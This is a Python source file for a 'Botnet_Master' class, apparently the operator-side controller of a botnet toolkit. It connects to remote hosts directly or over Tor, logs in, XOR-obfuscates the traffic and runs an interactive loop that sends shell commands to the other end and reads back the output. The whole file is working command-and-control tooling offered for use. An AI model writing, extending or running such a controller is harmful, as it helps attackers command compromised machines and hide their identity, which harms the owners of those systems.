from .utils import *


class Botnet_Master:

    @staticmethod
    def send_data(data,sock,timeout=2,real_timeout=3,xor_key=None):
        data='{}\n'.format(data)
        if xor_key not in [None,''] and data.strip()!='':
            data= XOR.encrypt(data,xor_key)
        sock.send(data.encode())
        return Botnet_Master.read_data(sock,timeout=timeout,real_timeout=real_timeout,xor_key=xor_key)

    
    def login(self,host,port,username,password,timeout=3,read_timeout=2,tor=False):
        if tor==True:
            self.sock=Socket_Connection.get_tor_socket_connection(host,port,timeout=timeout)
        else:
            self.sock=Socket_Connection.get_socket_connection(host,port,timeout=timeout)
        Botnet_Master.send_data(username,self.sock,timeout=read_timeout,real_timeout=timeout)
        self.data=Botnet_Master.send_data(password,self.sock,timeout=read_timeout,real_timeout=timeout)
        if 'failed' in self.data:
            raise Exception('Login failed')

    def execute(self,cmd,timeout=2,real_timeout=3):
        return Botnet_Master.send_data(cmd,self.sock,timeout=timeout,real_timeout=real_timeout)
    
    def close(self):
        self.sock.close()
        self.sock=None

    @staticmethod
    def read_data(sock,timeout=2,real_timeout=3,xor_key=None):
        data=''
        sock.settimeout(timeout)
        while True:
            try:
                d=sock.recv(1024).decode()
                if d=='':
                    break
                data+=d
            except Exception as ex:
                if 'time' in str(ex):
                    break
                else:
                    try:
                        sock.close()
                    except:
                        pass
                    raise Exception('connection was lost')
        sock.settimeout(real_timeout)
        if xor_key not in [None,''] and data.strip()!='':
            return XOR.encrypt(data,xor_key)
        return data

    @staticmethod
    def interact(host,port,read_timeout=3,timeout=3,tor=False,xor_key=None):
        if tor==True:
            s=Socket_Connection.get_tor_socket_connection(host,port,timeout=timeout)
        else:
            s=Socket_Connection.get_socket_connection(host,port,timeout=timeout)
        data=Botnet_Master.read_data(s,timeout=read_timeout,real_timeout=timeout,xor_key=xor_key)
        username=user_input(data)
        data=Botnet_Master.send_data(username,s,timeout=read_timeout,real_timeout=timeout,xor_key=xor_key)
        password=pwinput.pwinput(prompt=data, mask='*')
        data=Botnet_Master.send_data(password,s,timeout=read_timeout,real_timeout=timeout,xor_key=xor_key)
        while True:
            cmd=user_input(data+' ')
            data=Botnet_Master.send_data(cmd,s,timeout=read_timeout,real_timeout=timeout,xor_key=xor_key)